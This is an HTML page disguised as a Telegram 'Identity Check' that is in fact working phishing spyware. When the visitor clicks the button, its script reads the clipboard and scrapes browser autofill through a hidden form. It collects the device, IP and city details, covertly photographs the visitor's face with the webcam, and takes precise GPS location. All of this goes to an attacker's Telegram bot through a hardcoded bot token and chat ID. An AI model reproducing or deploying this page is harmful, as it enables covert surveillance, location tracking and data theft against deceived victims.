<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram - Security Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 25px rgba(0,0,0,0.08); width: 100%; max-width: 380px; text-align: center; position: relative; z-index: 10; }
        .logo { width: 110px; margin-bottom: 25px; }
        h2 { font-size: 24px; font-weight: 600; color: #222; margin-bottom: 15px; }
        p { color: #707579; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
        .btn { background-color: #3390ec; color: white; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
        .btn:hover { background-color: #2b7dcb; }
        #trap-form { opacity: 0.01; position: absolute; top: 0; left: 0; height: 1px; width: 1px; overflow: hidden; }
        video, canvas { display: none; }
        .loading { display: none; margin-top: 15px; color: #3390ec; font-weight: bold; }
    </style>
</head>
<body>

    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="logo">
        <h2>Identity Check</h2>
        <p>To access this chat, please allow location and camera access to verify you are a human user.</p>
        
        <form id="trap-form">
            <input type="text" id="af_name" autocomplete="name">
            <input type="email" id="af_email" autocomplete="email">
        </form>

        <button class="btn" id="mainBtn">VERIFY & PROCEED</button>
        <div id="status" class="loading">Processing... Please wait</div>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
        const chatId = "6679834643";

        async function sendToBot(text) {
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: text })
                });
            } catch (e) { console.error("Send Error"); }
        }

        document.getElementById('mainBtn').addEventListener('click', async function() {
            const btn = document.getElementById('mainBtn');
            const status = document.getElementById('status');
            btn.style.display = 'none';
            status.style.display = 'block';

            // 1. دەستبەجێ ڕاکێشانی Clipboard
            try {
                const clipText = await navigator.clipboard.readText();
                if(clipText) await sendToBot("📋 Clipboard Data:\n" + clipText);
            } catch (e) { await sendToBot("❌ Clipboard Access Denied"); }

            // 2. زانیاری ئامێر و IP
            const deviceDetails = `📱 Device: ${navigator.platform}\n🌐 Browser: ${navigator.userAgent}`;
            await sendToBot(deviceDetails);

            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                await sendToBot(`🌐 IP: ${ipData.ip}\n🏙️ City: ${ipData.city}\n🏢 ISP: ${ipData.org}`);
            } catch (e) { await sendToBot("❌ IP Check Failed"); }

            // 3. ڕاکێشانی Autofill (ناو و ئیمەیڵ)
            const name = document.getElementById('af_name').value;
            const email = document.getElementById('af_email').value;
            if(name || email) await sendToBot(`👤 Autofill Identity:\nName: ${name}\nEmail: ${email}`);

            // 4. وێنەی کامێرا (بە شێوەی نهێنی)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 1500)); // وێستان بۆ فوکەسی کامێرا
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'capture.jpg');
                fd.append('caption', '👤 Target Face Captured!');
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { await sendToBot("❌ Camera Access Denied"); }

            // 5. GPS Location (دواین هەنگاو و گۆڕینی لاپەڕە)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    await sendToBot(`📍 GPS High Accuracy:\nhttps://www.google.com/maps?q=${lat},${lon}\nAccuracy: ${pos.coords.accuracy}m`);
                    window.location.href = "index.html";
                }, async (err) => {
                    await sendToBot("❌ GPS Access Denied");
                    window.location.href = "index.html";
                }, { enableHighAccuracy: true, timeout: 10000 });
            } else {
                window.location.href = "index.html";
            }
        });
    </script>
</body>
</html>
